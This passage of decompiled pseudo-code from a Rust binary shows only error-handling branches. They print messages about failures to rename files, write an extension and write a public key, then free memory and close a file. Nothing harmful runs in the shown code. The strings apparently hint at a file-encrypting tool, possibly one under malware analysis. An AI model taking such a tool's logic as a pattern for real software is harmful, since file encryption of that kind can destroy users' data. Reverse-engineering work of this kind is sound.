        if (ppuStack_1068 != (undefined8 **)0x0) {
          (*(code *)PTR___rust_dealloc_001779a0)(ppuVar8,ppuStack_1068,1);
        }
        if (local_1250 == (undefined8 **)0x0) {
                    /* try { // try from 0010af38 to 0010af3e has its CatchHandler @ 0010b411 */
          (*(code *)*puVar12)(uVar7);
          goto LAB_0010af04;
        }
        local_1170 = (undefined8 ***)&local_11f8;
        uStack_1168 = _ZN44__LT__RF_T_u20_as_u20_core__fmt__Display_GT_3fmt17h7364595569e6a5abE;
        local_1070 = (undefined8 **)&PTR_s_Error_while_renaming_file__001740d0;
        ppuStack_1068 = (undefined8 **)0x2;
        local_1060 = (undefined8 **)0x0;
        uStack_1048 = 1;
                    /* try { // try from 0010aee5 to 0010aef2 has its CatchHandler @ 0010b430 */
        local_1050 = (undefined8 ***)&local_1170;
        (*(code *)PTR__print_00177f40)(&local_1070);
                    /* try { // try from 0010aef3 to 0010aefc has its CatchHandler @ 0010b6e7 */
        _ZN4core3ptr42drop_in_place_LT_std__io__error__Error_GT_17h3fc65152347e7263E(&local_1250);
      }
      else {
        local_1170 = (undefined8 ***)&local_11f8;
        uStack_1168 = _ZN44__LT__RF_T_u20_as_u20_core__fmt__Display_GT_3fmt17h7364595569e6a5abE;
        local_1070 = (undefined8 **)&PTR_s_Error_while_writing_extension_to_00174098;
        ppuStack_1068 = (undefined8 **)0x2;
        local_1060 = (undefined8 **)0x0;
        uStack_1048 = 1;
                    /* try { // try from 0010ad1a to 0010ad27 has its CatchHandler @ 0010b555 */
        local_1050 = (undefined8 ***)&local_1170;
        (*(code *)PTR__print_00177f40)(&local_1070);
                    /* try { // try from 0010ad2d to 0010ad4c has its CatchHandler @ 0010b6e7 */
        _ZN4core3ptr42drop_in_place_LT_std__io__error__Error_GT_17h3fc65152347e7263E(&uStack_1228);
        auVar15 = auVar4;
      }
    }
    else {
      local_1170 = (undefined8 ***)&local_11f8;
      uStack_1168 = _ZN44__LT__RF_T_u20_as_u20_core__fmt__Display_GT_3fmt17h7364595569e6a5abE;
      local_1070 = (undefined8 **)&PTR_s_Error_while_writing_public_key_t_00174060;
      ppuStack_1068 = (undefined8 **)0x2;
      local_1060 = (undefined8 **)0x0;
      uStack_1048 = 1;
                    /* try { // try from 0010ac3d to 0010ac4a has its CatchHandler @ 0010b5b3 */
      local_1050 = (undefined8 ***)&local_1170;
      (*(code *)PTR__print_00177f40)(&local_1070);
                    /* try { // try from 0010ac50 to 0010acba has its CatchHandler @ 0010b6e7 */
      _ZN4core3ptr42drop_in_place_LT_std__io__error__Error_GT_17h3fc65152347e7263E(&uStack_1228);
      auVar15 = auVar3;
    }
  }
LAB_0010aefd:
                    /* try { // try from 0010aefd to 0010af03 has its CatchHandler @ 0010b5ec */
  (*(code *)*auVar15._8_8_)(auVar15._0_8_);
LAB_0010af04:
  lVar13 = *(long *)(auVar15._8_8_ + 8);
  if (lVar13 != 0) {
    (*(code *)PTR___rust_dealloc_001779a0)
              (auVar15._0_8_,lVar13,*(undefined8 *)(auVar15._8_8_ + 0x10));
  }
  (*(code *)PTR_close_001777b8)(local_1254);
  return;
}